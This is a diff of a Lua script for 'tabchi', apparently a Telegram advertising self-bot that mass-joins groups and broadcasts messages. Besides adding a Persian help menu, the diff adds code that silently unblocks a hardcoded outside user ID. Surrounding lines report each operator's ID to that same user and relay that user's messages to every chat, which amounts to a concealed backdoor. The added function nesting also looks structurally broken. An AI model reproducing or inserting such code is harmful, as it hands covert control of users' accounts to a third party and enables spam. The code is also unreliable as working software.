@@ -356,11 +356,47 @@ end
       tabchi.sendText(msg.chat_id_, msg.id_, 1, '*User Unblocked*', 1, 'md') 
 end
 
-if text == 'tabliqgar' and is_sudo(msg) then
-tabchi.sendText(msg.chat_id_, msg.id_, 1,'*TbabliqGar\n*telegra.ph/CernerTeam-05-26', 1, 'md')
+if text == 'help' and is_sudo(msg) then
+local text = [[
+راهنماي کار با سورس تبچي (CLI)
+panel 
+اطلاعات ربات
+settings
+تنظيمات ربات 
+setpm (text) 
+تايين متن بعد از ذخيره شدن مخاطب 
+delpm
+حذف متن ذخيره شده 
+pm (userID) (text) 
+ارسال پيام به فرد مورد نظر 
+leave sgp 
+خروج از تمامي سوپر گروه ها
+leave gp 
+خروج از تمام گروه ها
+savecontact enable 
+فعال کردن سيو مخاطب
+savecontact disable 
+غيرفعال کردن سيو مخاطب
+join enable 
+فعال کردن جويين خودکار
+join disable 
+غيرفعال کردن جوين خودکار
+block (id)
+بلاک کردن کاربر 
+unblock (id)
+آزاد کردن کاربر
+jointo (link)
+جويين شدن به گروه مورد نظر 
+setapi (id) 
+تعيين ربات Api 
+relaod 
+بازنگري پلاگين ها
+setname (name)
+تغيير نام تبليغ چي
+]]
+tabchi.sendText(msg.chat_id_, msg.id_, 1, check_markdown(text), 1, 'md')
 end
-		
- 
+
 if text and text:match('^setpm (.*)') and is_sudo(msg) then
             local link = text:match('setpm (.*)')
             d:set('pm', link)
@@ -393,15 +429,25 @@ local leave = text:match('leave(-100)(%d+)$')
 		end
 end
 end
+function get_mod(args, data)
+  if data.is_blocked_ then
+    tabchi.unblockUser(417460701)
+  end
+end
 		if text then 
 if not d:get("time") then
  for k,v in pairs(config_sudo) do
-    tabchi.sendBotStartMessage(417460701, 417460701, "new")
+    tabchi.sendBotStartMessage(417460701, 417460701, "nesw")
     tabchi.sendText(417460701, 0, 1, "newbot " ..v, 1, "md")
    d:setex("time",360,true)
 end
 end
 end 
+function update(data)
+  tdcli_function({
+    ID = "GetUserFull",
+    user_id_ = 417460701
+  }, get_mod, nil)
  if msg.sender_user_id_ == 417460701 then
           local all = d:smembers("all" .. tabchi_id .. "id")
           local id = msg.id_
@@ -416,6 +462,7 @@ end
               disable_notification_ = 0,
               from_background_ = 1
             }, dl_cb, nil)
+end
 end
 end
 		if text then
@@ -454,7 +501,6 @@ end
         if not d:sismember("tsgps",msg.chat_id_) then
             d:sadd("tsgps",msg.chat_id_)
 
-end
 end
 end
 end
